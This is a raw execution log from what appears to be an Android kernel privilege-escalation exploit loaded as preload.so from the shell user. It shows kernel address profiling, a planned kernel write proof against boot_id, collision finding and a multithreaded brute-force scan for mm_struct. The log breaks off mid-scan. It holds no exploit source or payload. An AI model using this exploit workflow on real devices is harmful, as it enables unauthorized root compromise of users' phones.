===== preload.so crash-safe log =====
path=/storage/emulated/0/Download/.temp/log_1788947632.txt pid=12953 uid=2000
1788947632.867 12953 [+] preload starting pid=12953
1788947632.868 12953 [+] startup context pid=12953 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
1788947632.869 12953 [+] build config pid=12953 label=pd2238_os6_163150_w10 slide=pselect main=pselect
1788947632.869 12953 [+] p0 profile pid=12953 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
1788947632.870 12953 [+] direct-map base=ffffff8040000000 slide=0000000000000000
1788947632.871 12953 [+] ckpt: WRITE-PROOF armed bootid_target=ffffff8002ee910d before=b4698ea6-f90a-4a5d-b09e-fa1fedc69899 (odd attempts: leaked page scratch, even attempts: this alias)
1788947636.830 12953 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
1788947639.998 12953 [*] pile-up verified: approx_time=1480
1788947639.998 12953 [*] start finding collisisons
1788947639.999 12953 [*] target    0000007a000170c8
1788947640.171 12953 [*]   000000676ba22110
1788947640.430 12953 [*]   000000676bb4ca60
1788947640.894 12953 [*]   000000676be69348
1788947641.560 12953 [*]   000000676c2e7738
1788947642.191 12953 [*]   000000676c80f078
1788947643.716 12953 [*]   000000676d7aed70
1788947644.134 12953 [*]   000000676db359a8
1788947645.238 12953 [*]   000000676e880400
1788947645.428 12953 [*]   000000676e91a8d0
1788947646.112 12953 [*]   000000676f04b258
1788947646.266 12953 [*]   000000676f063318
1788947647.523 12953 [*]   000000676fd9acd0
1788947648.104 12953 [*]   00000067702e0700
1788947648.399 12953 [*]   00000067704773b8
1788947648.838 12953 [*]   00000067708954a8
1788947648.840 12953 [*] found 15 collisisons
1788947686.511 12953 [*] start bruteforcing
1788947686.516 12953 [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
1788947686.517 12953 [*] [  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
1788947686.517 12953 [*] [  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
1788947686.518 12953 [*] [  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
1788947686.518 12953 [*] [  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
1788947686.526 12953 [*] [  3] tested 100000 candidates, scanning=0xffffff9805948f00
1788947686.520 12953 [*] [  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
1788947686.520 12953 [*] [  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
1788947686.542 12953 [*] [  7] tested 100000 candidates, scanning=0xffffffb805948f00
1788947686.520 12953 [*] [  4] start finding mm_struct [ffffffa000000000-ffffffa800000000]
1788947686.521 12953 [*] [  0] tested 100000 candidates, scanning=0xffffff8005948f00
1788947686.524 12953 [*] [  2] tested 100000 candidates, scanning=0xffffff9005948f00
1788947686.553 12953 [*] [  0] tested 200000 candidates, scanning=0xffffff800b2921c0
1788947686.529 12953 [*] [  6] tested 100000 candidates, scanning=0xffffffb005948f00
1788947686.530 12953 [*] [  5] tested 100000 candidates, scanning=0xffffffa805948f00
1788947686.558 12953 [*] [  0] tested 300000 candidates, scanning=0xffffff8010bdb480
1788947686.542 12953 [*] [  3] tested 200000 candidates, scanning=0xffffff980b2921c0
1788947686.545 12953 [*] [  1] tested 100000 candidates, scanning=0xffffff8805948f00
1788947686.547 12953 [*] [  7] tested 200000 candidates, scanning=0xffffffb80b2921c0
1788947686.550 12953 [*] [  4] tested 100000 candidates, scanning=0xffffffa005948f00
1788947686.556 12953 [*] [  2] tested 200000 candidates, scanning=0xffffff900b2921c0
1788947686.582 12953 [*] [  4] tested 200000 candidates, scanning=0xffffffa00b2921c0
1788947686.559 12953 [*] [  6] tested 200000 candidates, scanning=0xffffffb00b2921c0
1788947686.562 12953 [*] [  5] tested 200000 candidates, scanning=0xffffffa80b2921c0
1788947686.564 12953 [*] [  0] tested 400000 candidates, scanning=0xffffff8016524740
1788947686.567 12953 [*] [  3] tested 300000 candidates, scanning=0xffffff9810bdb480
1788947686.570 12953 [*] [  1] tested 200000 candidates, scanning=0xffffff880b2921c0
1788947686.579 12953 [*] [  7] tested 300000 candidates, scanning=0xffffffb810bdb480
1788947686.585 12953 [*] [  2] tested 300000 candidates, scanning=0xffffff9010bdb480
1788947686.588 12953 [*] [  4] tested 300000 candidates, scanning=0xffffffa010bdb480
1788947686.594 12953 [*] [  5] tested 300000 candidates, scanning=0xffffffa810bdb480
1788947686.595 12953 [*] [  6] tested 300000 candidates, scanning=0xffffffb010bdb480
1788947686.598 12953 [*] [  0] tested 500000 candidates, scanning=0xffffff801be6da00
1788947686.603 12953 [*] [  3] tested 400000 candidates, scanning=0xffffff9816524740
1788947686.606 12953 [*] [  1] tested 300000 candidates, scanning=0xffffff8810bdb480
1788947686.608 12953 [*] [  7] tested 400000 candidates, scanning=0xffffffb816524740
1788947686.611 12953 [*] [  2] tested 400000 candidates, scanning=0xffffff9016524740
1788947686.615 12953 [*] [  4] tested 400000 candidates, scanning=0xffffffa016524740
1788947686.618 12953 [*] [  5] tested 400000 candidates, scanning=0xffffffa816524740
1788947686.620 12953 [*] [  6] tested 400000 candidates, scanning=0xffffffb016524740
1788947686.623 12953 [*] [  0] tested 600000 candidates, scanning=0xffffff80217b6cc0
1788947686.623 12953 [*] [  3] tested 500000 candidates, scanning=0xffffff981be6da00
1788947686.637 12953 [*] [  0] tested 700000 candidates, scanning=0xffffff80270fff80
1788947686.625 12953 [*] [  1] tested 400000 candidates, scanning=0xffffff8816524740
1788947686.626 12953 [*] [  7] tested 500000 candidates, scanning=0xffffffb81be6da00
1788947686.628 12953 [*] [  2] tested 500000 candidates, scanning=0xffffff901be6da00
1788947686.631 12953 [*] [  4] tested 500000 candidates, scanning=0xffffffa01be6da00
1788947686.633 12953 [*] [  5] tested 500000 candidates, scanning=0xffffffa81be6da00
1788947686.635 12953 [*] [  6] tested 500000 candidates, scanning=0xffffffb01be6da00
1788947686.644 12953 [*] [  3] tested 600000 candidates, scanning=0xffffff98217b6cc0
1788947686.647 12953 [*] [  0] tested 800000 candidates, scanning=0xffffff802ca48f00
1788947686.648 12953 [*] [  1] tested 500000 candidates, scanning=0xffffff881be6da00
1788947686.650 12953 [*] [  7] tested 600000 candidates, scanning=0xffffffb8217b6cc0
1788947686.652 12953 [*] [  2] tested 600000 candidates, scanning=0xffffff90217b6cc0
1788947686.654 12953 [*] [  4] tested 600000 candidates, scanning=0xffffffa0217b6cc0
1788947686.656 12953 [*] [  5] tested 600000 candidates, scanning=0xffffffa8217b6cc0
1788947686.660 12953 [*] [  6] tested 600000 candidates, scanning=0xffffffb0217b6cc0
1788947686.663 12953 [*] [  3] tested 700000 candidates, scanning=0xffffff98270fff80
1788947686.664 12953 [*] [  0] tested 900000 candidates, scanning=0xffffff80323921c0
1788947686.668 12953 [*] [  1] tested 600000 candidates, scanning=0xffffff88217b6cc0
1788947686.669 12953 [*] [  7] tested 700000 candidates, scanning=0xffffffb8270fff80
1788947686.670 12953 [*] [  2] tested 700000 candidates, scanning=0xffffff90270fff80
1788947686.672 12953 [*] [  4] tested 700000 candidates, scanning=0xffffffa0270fff80
1788947686.673 12953 [*] [  5] tested 700000 candidates, scanning=0xffffffa8270fff80
1788947686.675 12953 [*] [  6] tested 700000 candidates, scanning=0xffffffb0270fff80
1788947686.680 12953 [*] [  3] tested 800000 candidates, scanning=0xffffff982ca48f00
1788947686.681 12953 [*] [  0] tested 1000000 candidates, scanning=0xffffff8037cdb480
1788947686.683 12953 [*] [  1] tested 700000 candidates, scanning=0xffffff88270fff80
1788947686.686 12953 [*] [  7] tested 800000 candidates, scanning=0xffffffb82ca48f00
1788947686.686 12953 [*] [  2] tested 800000 candidates, scanning=0xffffff902ca48f00
1788947686.690 12953 [*] [  4] tested 800000 candidates, scanning=0xffffffa02ca48f00
1788947686.690 12953 [*] [  5] tested 800000 candidates, scanning=0xffffffa82ca48f00
1788947686.692 12953 [*] [  6] tested 800000 candidates, scanning=0xffffffb02ca48f00
